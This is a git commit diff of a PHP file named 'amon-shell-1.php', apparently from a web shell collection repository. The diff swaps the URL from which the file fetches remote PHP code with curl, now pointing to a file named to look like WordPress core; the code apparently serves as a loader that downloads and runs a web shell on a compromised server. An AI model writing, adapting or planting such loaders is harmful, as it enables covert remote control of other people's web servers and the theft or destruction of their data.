38443a379627957c15c00bfc9209d6076b52bd38
rendihidayat683 <rendihidayat683@gmail.com>
2025-10-19 08:49:25 +0700

    Update and rename amon-shell-13.php to amon-shell-1.php

--- amon-shell-1.php
+++ amon-shell-1.php
@@ -832,7 +832,7 @@
 .
 .
 <?php
-    $Url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/index.php";
+    $Url = "https://raw.githubusercontent.com/rendihidayat683/weblist-SHELL/refs/heads/main/2025wp-inc-vn.php";
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $Url);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
